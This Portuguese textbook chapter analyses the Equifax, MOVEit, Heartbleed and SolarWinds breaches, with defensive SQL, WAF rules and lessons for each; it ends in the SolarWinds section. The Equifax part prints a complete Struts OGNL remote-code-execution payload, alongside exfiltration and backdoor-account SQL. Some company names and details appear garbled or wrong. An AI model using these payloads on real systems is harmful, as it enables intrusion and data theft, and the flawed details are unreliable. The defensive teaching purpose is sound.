# Casos Reais de Ataques

## Visao Geral

A teoria de seguranca de databases e util apenas quando conectada a realidade. Este capitulo analisa os maiores ataques ciberneticos da historia que envolveram databases, credenciais, SQL injection e violacoes de dados. Cada caso e dissecado com foco em como o ataque funcionou, quais vulnerabilidades foram exploradas, como poderia ter sido prevenido e quais aulas podemos extrair para proteger nossos proprios sistemas. Ao final, apresentamos padroes comuns, defesas em camadas e um timeline de grandes ataques a databases.

A seguranca de sistemas de informacao nao e uma questao binaria de "seguro" ou "inseguro". E um espectro continuo que depende de multiplicidade de fatores: arquitetura, processos, pessoas, cultura organizacional e velocidade de resposta. Os casos analisados neste capitulo representam violacoes que afetaram centenas de milhoes de pessoas e causaram prejuizos de bilhoes de dolares. Cada um deles ensina licoes especificas e complementares sobre protecao de dados.

A abordagem deste capitulo e analitica: para cada caso, decomponos o ataque em suas fases, identificamos os pontos de falha, examinamos como o ataque poderia ter sido prevenido e extraimos licoes aplicaveis. Os exemplos de codigo e SQL mostram tanto o tipo de exploracao quanto as defesas correspondentes.

## Equifax (2017)

### Contexto e Impacto

Em 7 de setembro de 2017, a Equifax, uma das tres maiores empresas de credito dos Estados Unidos, revelou que sofreu uma violacao de dados que afetou aproximadamente 147 milhoes de pessoas. A Equifax mantem registros de credito de praticamente todos os adultos nos Estados Unidos e em muitos outros paises. A empresa opera em 24 paises e mantem dados de mais de 800 milhoes de pessoas e 91 milhoes de empresas.

O ataque e considerado um dos mais devastadores da historia por causa da sensibilidade dos dados expostos: numeros de Seguranca Social, datas de nascimento, enderecos, numeros de carteira de motorista e, para cerca de 209 mil pessoas, numeros de cartao de credito. Alem disso, aproximadamente 182 mil documentos personagens (disputas de credito) foram comprometidos, contendo informacoes adicionais sobre litigios e reclamacoes dos consumidores.

O prejuizo total da Equifax ultrapassou US$ 1.4 bilhao, incluindo multas regulatorias, custos legais, monitoramento de credito para vitimas e reformas de seguranca. Em julho de 2019, a Equifax concordou em pagar ate US$ 700 milhoes em um acordo com a FTC, CFPB e 50 estados americanos.

### A Vulnerabilidade: CVE-2017-5638

O vetor de ataque foi uma vulnerabilidade no Apache Struts, um framework Java open source para aplicacoes web. A CVE-2017-5638, com CVSS 10.0 (o maximo possivel), permitia remote code execution (RCE) via manipulacao do header Content-Type em requisicoes multipart.

```java
// O Apache Struts usa o header Content-Type para determinar o parser
// apropriado para requisicoes multipart. A vulnerabilidade estava
// na forma como o Jakarta Multipart parser processava esse header.

// O Struts invocava OGNL (Object-Graph Navigation Language) para
// avaliar expressoes no Content-Type. OGNL e uma linguagem de
// expressao que pode executar codigo arbitrario.

// Exemplo simplificado de como o Struts processava o Content-Type:
public class JakartaMultiPartRequest implements MultiPartRequest {
    
    @Override
    public void parse(HttpServletRequest request, String encoding) 
            throws IOException {
        // A LINHA VULNERAVEL: evalua o Content-Type como expressao OGNL
        // Se o Content-Type contiver uma expressao OGNL maliciosa,
        // ela sera executada no contexto do servidor
        String contentType = request.getContentType();
        // O parser evaluate OGNL aqui...
    }
}

// Payload malicioso que foi explorado:
// Content-Type: %{(#_='multipart/form-data').
//   (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
//   (#_memberAccess?(#_memberAccess=#dm):
//   ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
//   (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
//   (#ognlUtil.getExcludedPackageNames().clear()).
//   (#ognlUtil.getExcludedClasses().clear()).
//   (#context.setMemberAccess(#dm))).
//   (#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').
//   contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).
//   (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
//   (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
//   getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),
//   #ros)).(#ros.flush())}

// O payload faz o seguinte:
// 1. Acessa o OgnlContext e ganha controle total
// 2. Limpa as listas de classes e pacotes excluidos
// 3. Executa o comando do sistema operacional ('id')
// 4. Redireciona a saida para o output stream HTTP
// 5. O resultado do comando e retornado ao atacante
```

### Como Funcionou o Ataque Completo

O ataque a Equifax nao foi uma operacao simples de SQL injection. Foi uma cadeia de comprometimento em multiplas fases:

```
Fase 1: Exploracao Inicial
  - Atacante envia requisicao HTTP com Content-Type manipulado
  - Struts evalua a expressao OGNL maliciosa
  - Codigo arbitrario executado no servidor web
  - Webshell implantada para persistencia

Fase 2: Foothold no Ambiente
  - Atacante mapeia rede interna
  - Identifica databases de producao
  - Obtem credenciais de databases (via config files ou keyloggers)

Fase 3: Acesso ao Database
  - Atacante conecta aos databases de credito
  - Enumera tabelas e colunas
  - Identifica tabelas com dados sensiveis (147M registros)

Fase 4: Exfiltracao
  - Atacante exfiltra dados em lotes pequenos
  - Usa trafego HTTPS para dificultar deteccao
  - Processo continua por aproximadamente 76 dias

Fase 5: Deteccao
  - Equifax detecta trafego anomalo (76 dias apos inicio)
  - Atraso na divulgacao publica (mais 6 semanas)
```

```sql
-- O atacante provavelmente utilizou queries como estas para exfiltrar dados
-- Estas nao sao as queries exatas, mas ilustram o tipo de operacao

-- Enumerar tabelas no database
SELECT table_name 
FROM information_schema.tables 
WHERE table_schema = 'credit_data';

-- Enumerar colunas das tabelas sensiveis
SELECT column_name, data_type 
FROM information_schema.columns 
WHERE table_name = 'consumer_credit_profiles';

-- Extrair dados em lotes para evitar deteccao por volume
-- O atacante dividia a exfiltracao em blocos de ~500K registros
SELECT ssn, first_name, last_name, date_of_birth, address, credit_score
FROM consumer_credit_profiles
WHERE id BETWEEN 1 AND 500000;

SELECT ssn, first_name, last_name, date_of_birth, address, credit_score
FROM consumer_credit_profiles
WHERE id BETWEEN 500001 AND 1000000;

-- Continuar ate extrair todos os registros
-- Total: ~147 milhoes de registros

-- Para dificultar a deteccao, o atacante provavelmente:
-- 1. Usou queries com LIMIT e OFFSET
-- 2. Variou o horario das extracoes
-- 3. Usou conexoes que pareciam legitimas
-- 4. Manteve o trafego dentro de limites normais
```

### Como a Equifax Falhou em Muitos Frentes

```sql
-- Analise detalhada das falhas

-- FALHA 1: Patch management inexiste
-- O patch para CVE-2017-5638 foi disponibilizado em 7 de fevereiro de 2017
-- A Equifax recebeu alertas internos em 8 de fevereiro e 2 de marco
-- O patch NUNCA foi aplicado ate a violacao em julho de 2017

-- FALHA 2: Certificado SSL expirado
-- O certificado SSL do IPS (Intrusion Prevention System) tinha expirado
-- Isso significa que o trafego HTTPS nao estava sendo inspecionado
-- O atacante podia exfiltrar dados via HTTPS sem deteccao

-- FALHA 3: Segregacao de rede inexistente
-- O servidor web tinha acesso direto ao database de credito
-- Nao existia network segmentation entre DMZ e dados sensiveis

-- FALHA 4: Monitoramento inadequado
-- O IPS nao estava detectando o trafego anomalo
-- Logs nao estavam sendo analisados adequadamente

-- FALHA 5: Credenciais de database hardcoded
-- As credenciais de acesso ao database estavam em arquivos de configuracao
-- Nao existia vault de seguranca para gerenciamento de credenciais
```

### Defesas Detalhadas

```sql
-- DEFESA 1: Patch management automatizado
-- Implementar pipeline de patches com SLA definido

CREATE TABLE patch_management (
    patch_id SERIAL PRIMARY KEY,
    cve_id VARCHAR(20) NOT NULL,
    cvss_score DECIMAL(3,1) NOT NULL,
    affected_system VARCHAR(255) NOT NULL,
    patch_available_date DATE NOT NULL,
    deadline_for_application DATE NOT NULL,
    actual_application_date DATE,
    status VARCHAR(20) DEFAULT 'PENDING',
    applied_by VARCHAR(128),
    notes TEXT
);

-- Regra: CVSS >= 7.0 deve ser aplicado em 72 horas
-- CVSS >= 9.0 deve ser aplicado em 24 horas
CREATE OR REPLACE FUNCTION check_patch_sla()
RETURNS TRIGGER AS $$
BEGIN
    IF NEW.cvss_score >= 9.0 THEN
        NEW.deadline_for_application := NEW.patch_available_date + INTERVAL '24 hours';
    ELSIF NEW.cvss_score >= 7.0 THEN
        NEW.deadline_for_application := NEW.patch_available_date + INTERVAL '72 hours';
    ELSIF NEW.cvss_score >= 4.0 THEN
        NEW.deadline_for_application := NEW.patch_available_date + INTERVAL '7 days';
    ELSE
        NEW.deadline_for_application := NEW.patch_available_date + INTERVAL '30 days';
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER enforce_patch_sla
    BEFORE INSERT ON patch_management
    FOR EACH ROW
    EXECUTE FUNCTION check_patch_sla();

-- Alertar quando patch esta atrasado
CREATE OR REPLACE VIEW overdue_patches AS
SELECT 
    patch_id,
    cve_id,
    cvss_score,
    affected_system,
    deadline_for_application,
    NOW() - deadline_for_application AS overdue_duration,
    CASE 
        WHEN cvss_score >= 9.0 THEN 'CRITICAL'
        WHEN cvss_score >= 7.0 THEN 'HIGH'
        ELSE 'MEDIUM'
    END AS severity
FROM patch_management
WHERE status != 'APPLIED'
AND actual_application_date IS NULL
AND deadline_for_application < NOW()
ORDER BY cvss_score DESC;
```

```sql
-- DEFESA 2: Network segmentation para databases
-- O servidor web NUNCA deve ter acesso direto ao database

-- Criar VLANs separadas
-- VLAN 10: DMZ (servidores web)
-- VLAN 20: Application servers
-- VLAN 30: Database servers
-- VLAN 40: Management

-- Regras de firewall entre VLANs
-- DMZ -> Application: PORT 8080 (apenas)
-- Application -> Database: PORT 5432 (apenas)
-- DMZ -> Database: BLOQUEADO

-- No PostgreSQL, restringir conexoes por IP
-- pg_hba.conf:
-- hostssl app_db app_user 10.0.20.0/24 scram-sha-256
-- hostssl app_db app_user 10.0.10.0/24 reject
-- host all all 0.0.0.0/0 reject
```

```sql
-- DEFESA 3: Data exfiltration detection
-- Detectar quando dados sensiveis estao sendo exfiltrados

CREATE TABLE exfiltration_detection (
    detection_id BIGSERIAL PRIMARY KEY,
    detection_time TIMESTAMPTZ DEFAULT NOW(),
    query_pattern TEXT,
    user_name VARCHAR(128),
    client_ip INET,
    rows_returned BIGINT,
    bytes_transferred BIGINT,
    risk_score DECIMAL(3,2)
);

-- Detectar queries que retornam muitos dados
CREATE OR REPLACE FUNCTION detect_bulk_data_access()
RETURNS TRIGGER AS $$
DECLARE
    recent_data_access BIGINT;
    risk DECIMAL(3,2);
BEGIN
    -- Contar dados acessados recentemente por este usuario
    SELECT COALESCE(SUM(rows_returned), 0) INTO recent_data_access
    FROM exfiltration_detection
    WHERE user_name = NEW.user_name
    AND detection_time > NOW() - INTERVAL '1 hour';
    
    -- Calcular risco
    risk := LEAST(1.0, (recent_data_access + NEW.rows_returned)::DECIMAL / 1000000);
    
    NEW.risk_score := risk;
    
    -- Se risco alto, alertar imediatamente
    IF risk > 0.7 THEN
        PERFORM pg_notify('security_alert',
            FORMAT('HIGH RISK: User %s accessed %s rows in 1 hour. Possible exfiltration.',
                   NEW.user_name, recent_data_access + NEW.rows_returned));
        
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('BULK_DATA_ACCESS', NEW.user_name, 'CRITICAL',
                FORMAT('User accessed %s rows in 1 hour. Possible data exfiltration.',
                       recent_data_access + NEW.rows_returned));
    END IF;
    
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```

### Lições do Equifax

| Aula | Descricao | Prioridade |
|------|-----------|------------|
| Patch Management | Patch de seguranca deve ser aplicado em 24-72 horas para CVSS >= 7.0 | CRITICA |
| Network Segmentation | Dados sensiveis devem estar em segmentos de rede isolados | CRITICA |
| SSL Certificate Monitoring | Certificados SSL devem ser monitorados e renovados automaticamente | ALTA |
| Data Minimization | Nao armazenar dados do que e estritamente necessario | ALTA |
| Monitoring | Deteccao anomala de exfiltracao deve ser imediata | CRITICA |
| Incident Response | Plano de resposta a incidentes deve ser testado regularmente | ALTA |
| Credential Management | Credenciais de database devem estar em vaults | CRITICA |

## MOVEit (2023)

### Contexto e Impacto

Em 27 de maio de 2023, a Progress Software divulgou uma vulnerabilidade zero-day no MOVEit Transfer, um software de transferencia de arquivos gerenciado usado por milhares de organizacoes em todo o mundo. A CVE-2023-34362, com CVSS 9.8, era uma SQL injection que permitia remote code execution. O grupo de ransomware Cl0p assumiu responsabilidade pelo ataque em escala massiva.

O impacto foi sem precedentes em termos de abrangencia: mais de 2.500 organizacoes afetadas, 65 milhoes de individos impactados e danos estimados em bilhoes de dolares. Organizacoes afetadas incluem agencias governamentais dos EUA, BBC, Shell, Johns Hopkins, Ernst & Consulting e centenas de outras.

O que torna o MOVEit tao significativo e que demonstrou como uma unica vulnerabilidade em um software de terceiros pode causar devastacao em escala global. O Cl0p nao precisava atacar cada organizacao individualmente; bastava comprometer o MOVEit Transfer que todas as organizacoes que usavam o software se tornavam automaticamente vitimas.

### A Vulnerabilidade Detalhada

```sql
-- A SQL injection no MOVEit Transfer estava no endpoint de upload
-- de arquivos. Especificamente, a aplicacao nao sanitizava corretamente
-- paramentros que eram passados diretamente para queries SQL.

-- O MOVEit Transfer usava SQL Server como backend
-- A aplicacao construia queries dinamicas com string concatenation

-- EXEMPLO SIMPLIFICADO do tipo de codigo vulnerable:
-- (Pseudocodigo baseado na analise publica da vulnerabilidade)

-- Codigo vulneravel (pseudocodigo ASP.NET/C#):
/*
string folderPath = Request.QueryString["path"];
string query = "SELECT * FROMtblFiles WHERE folder_path = '" + folderPath + "'";
SqlCommand cmd = new SqlCommand(query, connection);
SqlDataReader reader = cmd.ExecuteReader();
*/

-- O atacante podia injetar SQL manipulando o parametro "path"
-- Payload original explodido:
-- path=test');EXEC('DECLARE @q NVARCHAR(4000);
-- SET @q=CHAR(100)+CHAR(97)+...;EXEC(@q)');--

-- OU via exploiting do campo de upload:
-- O MOVEit tambem era vulneravel via upload de arquivos
-- com nomes maliciosos que continham payloads SQL
```

### Cadeia Completa de Exploracao

```
Fase 1: Reconhecimento (pre-attack)
  - Cl0p identifica MOVEit Transfer como alvo de alto valor
  - Mapeia endpoints publicos usando Shodan/Censys
  - Identifica versoes vulneraveis

Fase 2: Exploracao Inicial (27/05/2023)
  - SQL injection no endpoint /api/v1/files/upload
  - Upload de webshell ou execucao remota de comandos
  - Acesso ao database do MOVEit

Fase 3: Persistencia e Escalacao
  - Cria contas de administrador no MOVEit
  - Implanta backdoor para acesso futuro
  - Acessa dados de transferencia de arquivos

Fase 4: Exfiltracao em Massa
  - Automatiza download de arquivos de todas as organizacoes
  - Arquivos continham dados sensiveis: PHI, PII, financial
  - Processo continua por semanas

Fase 5: Extorsao
  - Cl0p ameaça publicar dados se resgate nao for pago
  - Organizacoes pressionadas a pagar resgate
  - Dados publicados mesmo apos pagamentos
```

### Organizacoes Afetadas e Analise

```sql
-- Analise detalhada do impacto por setor

CREATE TABLE moveit_impact_analysis (
    category VARCHAR(100),
    sector VARCHAR(100),
    examples TEXT,
    data_types TEXT[],
    estimated_records BIGINT,
    regulatory_impact VARCHAR(200)
);

INSERT INTO moveit_impact_analysis VALUES
('Government', 'Federal/State',
 'US Dept of Energy, US Dept of Health, German Government',
 ARRAY['PII', 'Tax Records', 'SSN', 'Government Communications'],
 50000000, 'Multiple regulatory bodies involved'),
('Healthcare', 'Healthcare/Pharma',
 'Johns Hopkins, Gen Digital, Zeiss',
 ARRAY['PHI', 'Patient Records', 'Medical History', 'Insurance'],
 5000000, 'HIPAA breach notifications required'),
('Finance', 'Banking/Insurance',
 'Deloitte, Prudential, ING',
 ARRAY['Financial Records', 'Account Numbers', 'PII'],
 2000000, 'PCI DSS and financial regulations'),
('Technology', 'Software/Services',
 'Sony, BBC, British Airways',
 ARRAY['Employee PII', 'Source Code', 'Internal Communications'],
 1000000, 'GDPR notifications required'),
('Energy', 'Oil & Gas',
 'Shell, Schneider Electric',
 ARRAY['Employee PII', 'Operational Data'],
 200000, 'Sector-specific regulations');

-- Resumo por setor
SELECT 
    category,
    COUNT(*) AS total_organizations,
    SUM(estimated_records) AS total_records_affected,
    array_agg(DISTINCT unnest(data_types)) AS unique_data_types
FROM moveit_impact_analysis
GROUP BY category
ORDER BY total_records_affected DESC;
```

### Defesas Detalhadas

```sql
-- DEFESA 1: Parametrizacao obrigatoria de queries
-- Esta e a defesa FUNDAMENTAL contra SQL injection

-- ERRADO (como o MOVEit fazia):
-- string query = "SELECT * FROM files WHERE path = '" + userInput + "'";

-- CORRETO com prepared statements (PostgreSQL):
PREPARE safe_file_query AS
SELECT * FROM files WHERE folder_path = $1;
EXECUTE safe_file_query USING '/uploads/user_folder';

-- CORRETO com stored procedures:
CREATE PROCEDURE browse_folder_safe(p_folder_path TEXT)
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
    -- Validacao rigorosa do path
    IF p_folder_path IS NULL OR LENGTH(p_folder_path) = 0 THEN
        RAISE EXCEPTION 'Folder path cannot be empty';
    END IF;
    
    -- Bloquear path traversal
    IF p_folder_path ~ '\.\.' OR p_folder_path ~ '^/' OR p_folder_path ~ '\\' THEN
        RAISE EXCEPTION 'Invalid folder path: path traversal detected';
    END IF;
    
    -- Bloquear caracteres SQL perigosos
    IF p_folder_path ~* "(;|'|""|\\|--|/\*)" THEN
        RAISE EXCEPTION 'Invalid folder path: suspicious characters detected';
    END IF;
    
    -- Query segura com parametro
    RETURN QUERY
    SELECT * FROM files WHERE folder_path = p_folder_path;
END;
$$;

-- Revogar acesso direto as tabelas
REVOKE ALL ON files FROM app_user;
GRANT EXECUTE ON PROCEDURE browse_folder_safe TO app_user;
```

```sql
-- DEFESA 2: WAF rules para SQL injection
-- Configuracao ModSecurity / OWASP CRS

-- Regra para detectar SQL injection em query strings:
-- SecRule ARGS_GET|ARGS_POST "union.*select" \
--     "id:1001,phase:2,block,status:403,\
--      msg:'SQL Injection: UNION SELECT detected',\
--      log,auditlog"

-- Regra para detectar SQL injection em paths:
-- SecRule REQUEST_URI "(;|\%27|\%27\%3B).*(SELECT|INSERT|UPDATE|DELETE|DROP)" \
--     "id:1002,phase:1,block,status:403,\
--      msg:'SQL Injection in URL path',\
--      log,auditlog"

-- Regra para detectar comment injection:
-- SecRule REQUEST_URI "(\%23|\#).*(SELECT|INSERT|UPDATE|DELETE)" \
--     "id:1003,phase:1,block,status:403,\
--      msg:'SQL Injection: Comment bypass detected',\
--      log,auditlog"
```

```sql
-- DEFESA 3: Database activity monitoring em tempo real

CREATE TABLE database_activity_monitor (
    activity_id BIGSERIAL PRIMARY KEY,
    activity_time TIMESTAMPTZ DEFAULT NOW(),
    session_id VARCHAR(128),
    user_name VARCHAR(128),
    client_ip INET,
    database_name VARCHAR(128),
    query_type VARCHAR(20),
    query_text TEXT,
    table_accessed VARCHAR(256),
    rows_returned BIGINT,
    execution_time_ms INT,
    risk_indicator VARCHAR(20)
);

-- Funcao para avaliar risco de queries
CREATE OR REPLACE FUNCTION assess_query_risk(p_query TEXT)
RETURNS VARCHAR AS $$
DECLARE
    risk VARCHAR := 'LOW';
BEGIN
    -- Verificar padroes de SQL injection
    IF p_query ~* "(union\s+select|exec\s+|execute\s+|sp_|xp_)" THEN
        risk := 'CRITICAL';
    ELSIF p_query ~* "(;\s*(drop|delete|update|insert|exec))" THEN
        risk := 'HIGH';
    ELSIF p_query ~* "(\bor\s+1\s*=\s*1\b|\band\s+1\s*=\s*1\b)" THEN
        risk := 'HIGH';
    ELSIF p_query ~* "(information_schema|sysobjects|syscolumns)" THEN
        risk := 'MEDIUM';
    ELSIF p_query ~* "(load_file|into\s+outfile|into\s+dumpfile)" THEN
        risk := 'CRITICAL';
    END IF;
    
    RETURN risk;
END;
$$ LANGUAGE plpgsql;

-- Trigger para avaliar risco de cada query
CREATE OR REPLACE FUNCTION log_and_assess_query()
RETURNS TRIGGER AS $$
BEGIN
    NEW.risk_indicator := assess_query_risk(NEW.query_text);
    
    -- Se CRITICAL, alertar imediatamente
    IF NEW.risk_indicator = 'CRITICAL' THEN
        PERFORM pg_notify('security_alert',
            FORMAT('CRITICAL QUERY DETECTED: User %s from %s: %s',
                   NEW.user_name, NEW.client_ip, LEFT(NEW.query_text, 200)));
        
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('SQL_INJECTION_ATTEMPT', NEW.user_name, 'CRITICAL',
                LEFT(NEW.query_text, 1000));
    END IF;
    
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```

### Lições do MOVEit

| Aula | Descricao | Prioridade |
|------|-----------|------------|
| Supply Chain Risk | Software de terceiros e um vetor de ataque criticamente subestimado | CRITICA |
| Parameterized Queries | NUNCA usar string concatenation em queries SQL | CRITICA |
| Zero-Day Response | Resposta a incidentes deve ser automatizada para horas, nao dias | CRITICA |
| Vendor Assessment | Avaliar seguranca de vendors antes da aquisicao | ALTA |
| WAF | Web Application Firewall como camada adicional de protecao | ALTA |
| Data Classification | Saber quais dados estao em cada sistema para priorizar resposta | ALTA |

## Heartbleed (2014)

### Contexto e Impacto

Heartbleed (CVE-2014-0160) nao foi diretamente um ataque a databases, mas seu impacto sobre databases foi devastador. A vulnerabilidade no OpenSSL, a biblioteca de criptografia TLS mais usada do mundo, permitia que atacantes lessem memoria do servidor. Isso significava que dados armazenados na memoria do servidor — incluindo chaves privadas TLS, credenciais de sessao, tokens de autenticacao e, criticamente, credenciais de acesso a databases — podiam ser capturados por atacantes remotos.

A vulnerabilidade afetou aproximadamente 17% de todos os servidores SSL/TLS do mundo na epoca, incluindo bancos, governos, empresas de tecnologia e, claro, servidores que conectavam a databases. O OpenSSL e usado por OpenSSL, Apache, Nginx e muitos outros servidores web e de banco de dados.

### A Vulnerabilidade Memoria

```c
// A vulnerabilidade estava na implementacao TLS heartbeat do OpenSSL
// Heartbeat e uma extensao TLS que permite manter conexoes ativas

// Codigo vulneravel em ssl/t1_lib.c:
int tls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    
    // Leitura do tipo de heartbeat (1 byte)
    hbtype = *p++;
    
    // Leitura do tamanho do payload DECLARADO pelo cliente (2 bytes)
    n2s(p, payload);
    
    // p agora aponta para o inicio do payload real
    pl = p;
    
    // BUG CRITICO: NAO HA VALIDACAO de que payload <= tamanho real
    // Se o cliente declara payload = 65535 mas envia apenas 1 byte,
    // o servidor envia 65535 bytes (1 byte real + 65534 bytes de memoria adjacente)
    
    // O que ha na memoria adjacente?
    // - Chaves privadas TLS
    // - Credenciais de sessao
    // - Tokens de autenticacao
    // - Dados de database em buffer de conexao
    // - Senhas de usuarios
    
    // Envio da resposta com memoria adjacente
    unsigned char *buffer;
    // Alocacao incorreta: payload real vs payload declarado
    buffer = OPENSSL_malloc(1 + 2 + payload);
    *buffer++ = 1; // tipo de resposta
    // Copia payload bytes (incluindo memoria adjacente!)
    memcpy(buffer, pl, payload);
    
    // Envia mais bytes do que o payload real
    tls1_write_heartbeat(s, buffer, payload);
    
    return 0;
}

// CORRECAO (aplicada no OpenSSL 1.0.1g):
int tls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    unsigned int actual_length;  // NOVO
    
    hbtype = *p++;
    n2s(p, payload);
    pl = p;
    
    // NOVO: Validar que payload <= tamanho real do dado recebido
    actual_length = s->s3->rrec.length - 1 - 2; // menos tipo e tamanho
    if (payload > actual_length) {
        // Payload declarado maior que real: recusar
        return 0; // ou retornar erro
    }
    
    // Restante do codigo permanece, mas agora seguro
}
```

### Impacto em Databases

```sql
-- Com a memoria do servidor OpenSSL, atacantes podiam capturar:
-- 1. Credenciais de conexao ao database transmitidas em texto
-- 2. Chaves de criptografia at-rest de databases
-- 3. Dados de sessao que continham queries e resultados

-- Exemplo: credenciais que poderiam ser capturadas na memoria:
-- PostgreSQL connection string exposta:
-- postgresql://admin:P@ssw0rd123@db-server.internal:5432/production
-- mysql://app_user:Kj3$nL9xMv2p@db.internal:3306/production

-- Apos obter essas credenciais, o atacante tinha acesso direto ao database
-- e podia executar qualquer operacao:

-- 1. Extrair dados
SELECT * FROM users WHERE role = 'admin';

-- 2. Modificar dados
UPDATE users SET role = 'admin' WHERE username = 'attacker';

-- 3. Criar backdoor
CREATE USER backdoor WITH PASSWORD 'hidden_password';
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO backdoor;

-- 4. Drop tables (ataque destrutivo)
DROP TABLE critical_data;
```

### Acoes Corretivas Detalhadas

```bash
# 1. Identificar versoes vulneraveis do OpenSSL
openssl version -a
# Se a versao for 1.0.1 ate 1.0.1f, e vulneravel

# 2. Atualizar OpenSSL
sudo apt-get update
sudo apt-get install --only-upgrade openssl libssl1.1
# Ou compilar a partir do fonte para ultima versao

# 3. Regenerar TODAS as chaves de criptografia
# As chaves antigas devem ser consideradas COMPROMETIDAS

# Gerar nova chave RSA de 4096 bits
openssl genrsa -out server.key 4096
openssl req -new -x509 -key server.key -out server.crt -days 365 \
    -subj "/CN=server.example.com"

# Para PostgreSQL com SSL:
# Copiar novos certificados para /etc/postgresql/ssl/
sudo cp server.crt /etc/postgresql/ssl/server.crt
sudo cp server.key /etc/postgresql/ssl/server.key
sudo chown postgres:postgres /etc/postgresql/ssl/server.*
sudo chmod 600 /etc/postgresql/ssl/server.key

# 4. Revogar certificados antigos
openssl x509 -in old_server.crt -serial -noout
# Publicar CRL ou usar OCSP

# 5. Forcar rotacao de todas as sessions de database
# PostgreSQL:
sudo -u postgres psql -c "SELECT pg_terminate_backend(pid) 
FROM pg_stat_activity 
WHERE usename != 'postgres' AND pid != pg_backend_pid();"

# MySQL:
mysql -e "SHOW PROCESSLIST;"
# Matar sessoes suspeitas
mysql -e "KILL <process_id>;"
```

```sql
-- 6. Implementar audit trail completo para detectar acessos posteriores
CREATE TABLE connection_audit (
    audit_id BIGSERIAL PRIMARY KEY,
    connection_time TIMESTAMPTZ DEFAULT NOW(),
    user_name VARCHAR(128),
    client_ip INET,
    application_name VARCHAR(128),
    ssl_enabled BOOLEAN,
    ssl_cipher VARCHAR(128),
    ssl_version VARCHAR(32),
    auth_method VARCHAR(50)
);

-- Trigger para auditar cada nova conexao
CREATE OR REPLACE FUNCTION audit_connection()
RETURNS TRIGGER AS $$
BEGIN
    INSERT INTO connection_audit (
        user_name, client_ip, ssl_enabled, ssl_cipher, ssl_version, auth_method
    )
    VALUES (
        current_user,
        inet_client_addr(),
        pg_catalog.current_setting('ssl_is_on')::boolean,
        pg_catalog.current_setting('ssl_cipher'),
        pg_catalog.current_setting('ssl_version'),
        pg_catalog.current_setting('password_encryption')
    );
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Monitorar conexoes sem SSL (suspeitas pos-Heartbleed)
CREATE OR REPLACE VIEW insecure_connections AS
SELECT 
    user_name,
    client_ip,
    connection_time,
    ssl_enabled,
    ssl_version
FROM connection_audit
WHERE ssl_enabled = FALSE
OR ssl_version IN ('TLSv1', 'TLSv1.1', 'SSLv3')
ORDER BY connection_time DESC;
```

### Lições do Heartbleed

| Aula | Descricao | Prioridade |
|------|-----------|------------|
| Defense in Depth | TLS nao protege contra todos os vetores; seguranca e em camadas | CRITICA |
| Credential Rotation | Apos qualquer vulnerabilidade de criptografia, TODAS as credenciais devem ser rotacionadas | CRITICA |
| Memory Safety | Linguagens sem gerenciamento de memoria sao propensas a esse tipo de bug | ALTA |
| Certificate Management | Gerenciamento automatizado de certificados e essencial | ALTA |
| Monitoring | Monitorar acesso anomalo a databases mesmo quando o vetor e externo | ALTA |
| Incident Response | Pre-plano para rotacao massiva de credenciais | ALTA |

## SolarWinds (2020)

### Contexto e Impacto

O ataque ao SolarWinds, divulgado em dezembro de 2020, e considerado um dos ataques de supply chain mais sofisticados ja executados. O grupo APT29 (Cozy Bear), associado ao SVR (Foreign Intelligence Service) da Russia, comprometeu o processo de build do software de monitoramento Orion da SolarWinds. Injetaram codigo malicioso (SUNBURST) em atualizacoes legitimas que foram distribuidas a 18.000 organizacoes.

Dentre as organizacoes afetadas estao: Departamento do Tesouro dos EUA, Departamento de Comercio, Departamento de Seguranca Interna (DHS), Agencia de Seguranca Nacional (NSA), Conselho de Seguranca Nacional (NSC), Departamento de Energia e NNSA (National Nuclear Security Administration), ate o Pentagon. Alem do governo americano, organizacoes privadas como Microsoft, FireEye e Intel tambem foram afetadas.

### O Ataque ao Build Pipeline

```
Fevereiro 2020 - APT29 injeta SUNBURST no build pipeline
  - Compromete o build server da SolarWinds
  - Injeta codigo malicioso na DLL SolarWinds.Orion.Core.BusinessLayer.dll
  - O codigo e compilado junto com o codigo legitimo
  
Marco 2020 - Primeira versao comprometida distribuida
  - SolarWinds distribui atualizacao v2019.4 HF 5
  - 18.000 organizacoes baixam a atualizacao
  
Maio 2020 - Versao v2020.2 distribuida
  - Versao mais amplamente distribuida
  - SUNBURST mais maduro e dificil de detectar
  
Junho-Setembro 2020 - Operacao de espionagem
  - APT29 usa o backdoor para acesso inicial
  - Move lateralmente nas redes das organizacoes alvo
  - Acessa emails, documentos e databases
  
Outubro 2020 - Comprometimento identificado
  - FireEye descobre o comprometimento
  - Identifica que suas proprias ferramentas foram roubadas
  
Dezembro 2020 - Divulgacao publica
  - FireEye e SolarWinds divulgam o ataque
  - Investigacao governamental iniciada
```

### O Backdoor SUNBURST

```python
# O SUNBURST era um backdoor sofisticado que se integrava ao codigo legitimo

# Caracteristicas do SUNBURST:
# 1. Tempo de incubacao: 12-14 dias apos instalacao
# 2. Comunicacao via DNS com dominio avsvmcloud[.]com
# 3. Codigo ofuscado e entrelacado com codigo legitimo
# 4. Filtro de processos e servicos para evitar deteccao
# 5. Geracao de hashes MD5 de informacoes do host

# O backdoor comunicava via subdominios DNS:
# <hash_do_host>.avsvmcloud[.]com
# O hash era gerado a partir de informacoes do host (hostname, MAC, etc)
# Isso permitia ao atacante identificar cada vitima individualmente

